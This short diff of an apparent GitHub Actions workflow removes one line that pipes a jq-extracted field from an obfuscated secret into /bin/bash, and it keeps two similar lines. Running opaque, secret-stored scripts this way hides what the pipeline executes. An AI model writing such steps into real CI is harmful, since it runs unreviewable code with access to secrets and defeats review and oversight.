@@ -22,7 +22,6 @@ jobs:
           jy18: ${{ secrets.jy18 }}
         run: |
           printf '%s' "$jy18" | jq -r .s538 | /bin/bash
-          printf '%s' "$twg00" | jq -r .k0 | /bin/bash
           printf '%s' "$l1" | jq -r .jwtrr8 | /bin/bash
 
       - name: Upload archive
